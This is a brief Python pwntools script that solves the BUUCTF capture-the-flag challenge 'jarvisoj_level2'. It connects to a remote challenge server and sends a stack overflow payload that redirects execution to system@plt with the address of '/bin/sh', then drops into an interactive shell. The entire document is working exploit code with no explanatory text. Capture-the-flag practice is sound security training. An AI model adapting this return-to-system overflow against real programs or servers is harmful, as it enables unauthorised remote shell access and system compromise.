from pwn import *
from LibcSearcher import *

# BUUCTF - jarvisoj_level2
context(log_level = 'debug', arch = 'i386', os = 'linux')
p = remote('node5.buuoj.cn', 28362)
#p=process('./pwn')

system_plt_addr = 0x8048320
binsh_addr = 0x804A024

payload = b'a'*(0x88+0x4) + p32(system_plt_addr) + p32(0xdeadbeef) + p32(binsh_addr)
p.sendlineafter(b'Input:', payload)

p.interactive()
